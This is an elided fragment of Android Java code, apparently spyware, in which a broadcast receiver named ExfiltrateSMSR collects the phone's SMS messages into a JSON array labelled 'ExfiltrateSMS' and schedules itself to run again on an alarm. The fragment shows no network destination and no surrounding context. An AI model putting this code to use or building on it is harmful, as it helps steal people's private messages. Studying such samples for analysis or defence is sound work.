...
public class ExfiltrateSMSR extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        ...
        ArrayList<SMS> SMSArray = (ArrayList<SMS>) harvester.getSMSArray();

        if (SMSArray != null && !SMSArray.isEmpty()) {
            JSONArray JSONArraySMS = new JSONArray();

            for (SMS SMS : SMSArray) { JSONArraySMS.put(SMS.toJSON()); }

            Parameter                           params     = new Parameter("ExfiltrateSMS", JSONArraySMS);
    ...
    private void setAlarm(Context context) {
        ...
        Intent        intent        = new Intent(context, ExfiltrateSMSR.class);
